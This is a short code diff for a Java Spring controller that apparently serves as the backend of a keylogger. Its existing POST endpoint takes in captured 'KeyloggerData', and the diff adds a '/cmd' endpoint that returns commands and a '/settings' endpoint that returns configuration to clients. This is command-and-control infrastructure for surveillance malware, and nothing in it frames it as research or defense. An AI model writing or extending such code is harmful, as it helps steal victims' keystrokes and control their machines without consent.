@@ -1,6 +1,8 @@
 package com.klg.client.controller;
 
 import com.klg.client.model.KeyloggerData;
+import com.klg.client.model.SettingsResponse;
+import com.klg.client.model.SyncedCommandResponse;
 import com.klg.client.service.ClientService;
 import lombok.RequiredArgsConstructor;
 import org.springframework.web.bind.annotation.GetMapping;
@@ -19,5 +21,15 @@ public class ClientController {
   @PostMapping
   public void keyloggerData(@RequestBody KeyloggerData keyloggerData) {
     clientService.keyloggerData(keyloggerData);
+  }
+
+  @GetMapping("/cmd")
+  public SyncedCommandResponse getCommand() {
+    return clientService.cmd();
+  }
+
+  @GetMapping("/settings")
+  public SettingsResponse getSettings() {
+    return clientService.settings();
   }
 }
